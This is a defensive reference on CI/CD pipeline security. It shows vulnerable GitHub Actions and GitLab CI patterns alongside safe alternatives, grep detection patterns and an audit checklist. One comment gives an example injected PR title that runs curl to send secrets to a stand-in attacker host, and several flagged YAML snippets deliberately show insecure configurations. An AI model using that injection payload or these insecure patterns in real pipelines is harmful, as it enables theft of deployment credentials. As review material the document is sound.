# CI/CD Pipeline Security Reference

## Overview

CI/CD pipelines run with elevated trust (deploy credentials, cloud IAM roles, package-registry publish tokens) but are frequently triggered by low-trust input — a pull request title, a branch name, an issue comment. The core risk pattern across GitHub Actions and GitLab CI is the same: untrusted text reaching either a `run:`/`script:` shell context or a workflow that has write access to secrets.

---

## Untrusted PR Triggers

### GitHub Actions — Flag These

```yaml
# FLAG: pull_request_target runs with base-repo secrets/permissions but can check out
# and execute the PR's (attacker-controlled) code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker's code
      - run: npm install && npm test   # runs attacker code with base-repo secrets available

# FLAG: workflow_run triggered by a PR-producing workflow, then checking out and
# running that PR's artifact/code with elevated permissions
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  deploy:
    steps:
      - uses: actions/download-artifact@v4   # downloading an artifact built from PR code
      - run: ./deploy.sh                      # executing it with deploy secrets
```

### Safe Patterns (Do Not Flag)

```yaml
# SAFE: pull_request (not pull_request_target) — runs with the fork's own limited
# GITHUB_TOKEN and no access to base-repo secrets
on: pull_request

# SAFE: pull_request_target used only to comment/label, never checking out or
# executing PR code
on: pull_request_target
jobs:
  label:
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({ ...context.repo, issue_number: context.issue.number, labels: ['needs-review'] })
```

### GitLab CI — Flag These

```yaml
# FLAG: Pipelines for merge requests from forks running with protected-branch
# variables/secrets exposed
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
# CHECK: project setting "Pipelines for merged results" / "protected branch" scoping —
# forked MR pipelines should not have access to protected CI/CD variables
```

The rule of thumb: any trigger that (a) executes code from a fork or external contributor and (b) has access to repository secrets is a finding, regardless of exact event name. `pull_request_target` + checkout-of-head + execution is the single most common instance of this pattern.

---

## Script Injection via Expressions

### GitHub Actions — Flag These

```yaml
# FLAG: Attacker-controlled context value interpolated directly into a shell command
- run: echo "Building PR titled: ${{ github.event.pull_request.title }}"
  # title can contain: `; curl attacker.com/$(cat secrets) ; #` or backticks/$() injection

- run: |
    echo "${{ github.event.issue.title }}"
    echo "${{ github.event.comment.body }}"
    echo "${{ github.head_ref }}"          # branch name is attacker-controlled on a fork

# FLAG: Same pattern in a composite action or reusable workflow input
- run: deploy.sh "${{ inputs.branch_name }}"
```

### Safe Patterns (Do Not Flag)

```yaml
# SAFE: Value passed through an environment variable, not interpolated into the script text
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR titled: $PR_TITLE"
  # Shell treats $PR_TITLE as data, not as script source — injected metacharacters don't
  # get re-parsed as shell syntax the way template-expression interpolation does
```

Attacker-controlled `github.event.*` fields include PR/issue titles and bodies, comment bodies, branch names (`head_ref`), commit messages, and forked-repo names. Any of these interpolated directly into `${{ }}` inside a `run:` block is template-expression injection — the fix is always routing the value through `env:` first.

### GitLab CI — Flag These

```yaml
# FLAG: CI/CD variable containing user input interpolated directly into script
script:
  - echo "Merge request: $CI_MERGE_REQUEST_TITLE"   # title can contain shell metacharacters
    # if further piped into eval/sh -c or used to build a command string
```

---

## Credential Exfiltration

### Flag These

```yaml
# FLAG: Secrets passed to a third-party/community action of unpinned or unverified provenance
- uses: some-random-user/deploy-action@main    # unpinned ref, arbitrary maintainer
  with:
    aws-secret: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# FLAG: Secret printed to logs (directly or via debug output)
- run: echo "Token is ${{ secrets.DEPLOY_TOKEN }}"
- run: env   # dumps all environment variables, including any exported secrets

# FLAG: Secret written to a world-readable artifact or cache
- run: echo "${{ secrets.API_KEY }}" > build/config.json
- uses: actions/upload-artifact@v4
  with:
    path: build/   # now contains the secret, downloadable by anyone with repo read access
```

### Safe Patterns (Do Not Flag)

```yaml
# SAFE: Third-party action pinned to a full commit SHA, not a mutable tag/branch
- uses: some-vendor/deploy-action@a1b2c3d4e5f6...   # immutable pin

# SAFE: Minimal, scoped GITHUB_TOKEN permissions
permissions:
  contents: read
  # no write access unless a specific job step needs it

# SAFE: Secrets only referenced where required, never echoed or written to shared storage
```

GitHub Actions automatically redacts a secret's literal value from logs — but only if the log line matches the value exactly. `base64`-encoded, partially-transformed, or reconstructed-from-substrings secrets bypass this redaction; flag any step that transforms a secret before output.

---

## Cache/Artifact Poisoning

### Flag These

```yaml
# FLAG: Cache key derived from attacker-controlled branch/PR data, allowing a
# malicious PR to poison a cache entry later restored on a protected branch's build
- uses: actions/cache@v4
  with:
    key: build-${{ github.head_ref }}     # attacker picks the branch name / cache key

# FLAG: Restoring a cache/artifact produced by a fork-triggered workflow into a
# privileged (e.g. deploy) job without integrity verification
- uses: actions/download-artifact@v4
  with:
    name: build-output    # built by an untrusted pull_request workflow run
- run: ./deploy-from-artifact.sh   # trusts artifact contents implicitly
```

### Safe Patterns (Do Not Flag)

```yaml
# SAFE: Cache key scoped to trusted inputs (lockfile hash), not attacker-controlled text
- uses: actions/cache@v4
  with:
    key: build-${{ hashFiles('package-lock.json') }}

# SAFE: Artifacts consumed by privileged jobs are rebuilt from source in a trusted
# context rather than reused from an untrusted upstream job
```

---

## Grep Patterns

```bash
# pull_request_target usage
grep -rln "pull_request_target" .github/workflows/

# Direct expression interpolation in run: blocks (GitHub Actions)
grep -rn '\${{\s*github\.event\.' .github/workflows/*.yml | grep -i "run:\|echo\|script"

# Unpinned third-party actions (tag/branch instead of SHA)
grep -rEn "uses: [a-zA-Z0-9-]+/[a-zA-Z0-9-]+@(main|master|v[0-9]+)\b" .github/workflows/*.yml

# Secrets echoed to output
grep -rn "echo.*secrets\.\|echo \$GITHUB_TOKEN\|env\s*$" .github/workflows/*.yml

# Overly broad workflow permissions
grep -rn "permissions:\s*write-all\|contents:\s*write" .github/workflows/*.yml

# GitLab: interpolated CI variables in script blocks
grep -rn '\$CI_MERGE_REQUEST_TITLE\|\$CI_COMMIT_MESSAGE' .gitlab-ci.yml
```

---

## Testing Checklist

- [ ] No `pull_request_target` workflow checks out and executes PR head code with secrets available
- [ ] All `github.event.*`/`CI_MERGE_REQUEST_*` values routed through `env:` before use in a shell command
- [ ] Third-party actions pinned to a commit SHA, not a mutable tag or branch
- [ ] `GITHUB_TOKEN`/job permissions scoped to the minimum required (`contents: read` default)
- [ ] No secret is echoed, logged, or written into an uploaded artifact/cache
- [ ] Cache keys derived from trusted inputs (lockfiles), not attacker-controlled branch/PR text
- [ ] Privileged (deploy) jobs rebuild from trusted source rather than trusting fork-built artifacts
- [ ] Forked-repo MR/PR pipelines do not have access to protected-branch secrets

---

## References

- [GitHub Actions Security Hardening Guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitLab CI/CD Security](https://docs.gitlab.com/ee/ci/security/)
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
